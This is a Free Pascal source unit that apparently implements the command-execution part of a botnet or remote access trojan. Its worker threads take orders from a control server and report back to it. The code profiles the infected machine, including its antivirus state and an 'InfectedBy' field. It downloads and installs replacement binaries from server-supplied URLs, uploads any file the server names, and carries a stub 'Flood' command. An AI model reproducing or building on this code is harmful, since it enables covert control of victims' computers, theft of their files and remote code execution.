unit CmdWorker;

{$mode objfpc}{$H+}

interface

uses
  NetModule, Tools, Debug,
  Classes, SysUtils, IdMultipartFormData, Process, IdHTTP;

type
  TCmdWorker = class(TThread)
  Hat: TIdHTTP;
  ToPost: TIdMultipartFormDataStream;
  private
    FCmdID: String;
    FIndex: LongInt;
  public
    property Identifier: String read FCmdID write FCmdID;
    constructor Create(CmdID: String; Index: LongInt);
    destructor Destroy; override;
    procedure Execute; override;
    procedure Abort(AbortID: String);
  end;

  TWorkers = Array of TCmdWorker;

var
  Workers: TWorkers;

function ExecIndex(CmdID: String): LongInt;
function FindAPlace: LongInt;

implementation

//Functions used by commands



//General functions and Command Execution

function FindAPlace: LongInt;
var
  J: LongInt;
  Found: Boolean;
Begin
  Found:=False;
  For J:=Low(Workers) to High(Workers) do
  if Not(Assigned(Workers[J])) then Begin
    Result:=J;
    Found:=True;
    Break;
  end;
  if Not(Found) then Begin
    J:=High(Workers) + 1;
    SetLength(Workers, J + 1);
    Result:=J;
  end;
end;

function ExecIndex(CmdID: String): LongInt;
var
  J: LongInt;
Begin
  Result:=-1;
  For J:=Low(Workers) to High(Workers) do
  if Assigned(Workers[J]) then
  if Workers[J].Identifier=CmdID then Begin
    Result:=J;
    Break;
  end;
end;

constructor TCmdWorker.Create(CmdID: String; Index: LongInt);
Begin
  FreeOnTerminate:=True;
  FCmdID:=CmdID;
  FIndex:=Index;
  Hat:=TIdHTTP.Create(Nil);
  inherited Create(False);
end;

destructor TCmdWorker.Destroy;
Begin
  Hat.Free;
  ToPost.Free;
  inherited Destroy;
  Workers[FIndex]:=Nil;
end;

procedure TCmdWorker.Abort(AbortID: String);
var
  _ToPost: TIdMultipartFormDataStream;
Begin
  _ToPost:=TIdMultipartFormDataStream.Create;
  _ToPost.AddFormField('GUID', ID);
  _ToPost.AddFormField('ID', AbortID);
  _ToPost.AddFormField('RT', '1');
  _ToPost.AddFormField('Result', 'Abort successful.');
  Writeln('[',FIndex,'] ABORT-POST --> ',Hat.Post(Server+ResultsPHP, _ToPost));
  _ToPost.Free;
  Terminate;
end;

procedure TCmdWorker.Execute;
var

  Master: TProcess;
  MemStream: TMemoryStream;
  Error: Boolean = False;

  procedure DoPost;
  Begin
    try
     Writeln('[',FIndex,'] CMD-POST --> ',Hat.Post(Server+ResultsPHP, ToPost));
    except
    end;
  end;

Begin
  ToPost:=TIdMultipartFormDataStream.Create;
  ToPost.AddFormField('GUID', ID);
  ToPost.AddFormField('ID', FCmdID);
  Case Net.Commands.ReadString(FCmdID, 'Type', '') of
    'Register': Begin
      ToPost.AddFormField('RT', '3');

      AnalyzeSystem;
      ToPost.AddFormField('Nick', Nick);
      ToPost.AddFormField('OS', OS);
      ToPost.AddFormField('Comp', ComputerName);
      ToPost.AddFormField('User', UserName);
      ToPost.AddFormField('CPU', CPU);
      ToPost.AddFormField('GPU', GPU);
      ToPost.AddFormField('Anti', AVName);
      ToPost.AddFormField('Def', AVState);
      ToPost.AddFormField('Inf', Settings.ReadString('General', 'InfectedBy', 'Unknown'));
      DoPost;
    end;
    'Restart': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Restarting.');
      DoPost;
      Restart(FullName);
    end;
    'Update': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        Net.DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        RenameFile(FullName, FileName+'.old');
        MemStream.SaveToFile(FullName);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Update failed: '+E.Message);
          DoPost;
        end;
      end;
      MemStream.Free;
      if Not(Error) then Begin
        ToPost.AddFormField('Result', 'File downloaded, update in progress.');
        DoPost;
        Restart(FullName, True);
      end;
    end;
    'Uninstall': Begin

    end;
    'Flood': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'This is going to take a long time!');
      //DoPost;
      While Not(Terminated) do Begin
        //Doing some stuff
      end;
      ToPost.AddFormField('Result', 'All done!');
      DoPost;
    end;
    'Upload': Begin
      Writeln('It wants me to upload ',Net.Commands.ReadString(FCmdID, 'FileName', ''));
      ToPost.AddFormField('RT', '2');
      ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
      DoPost;
    end;
    'Ping': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Pong!');
      DoPost;
    end
    else Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Unknown command!');
      DoPost;
    end;
  end;
  Writeln('Thread [',FIndex,'] exited.');
  Sleep(1000); //Used to prevent the client from accidentally performing the same command again
end;

end.

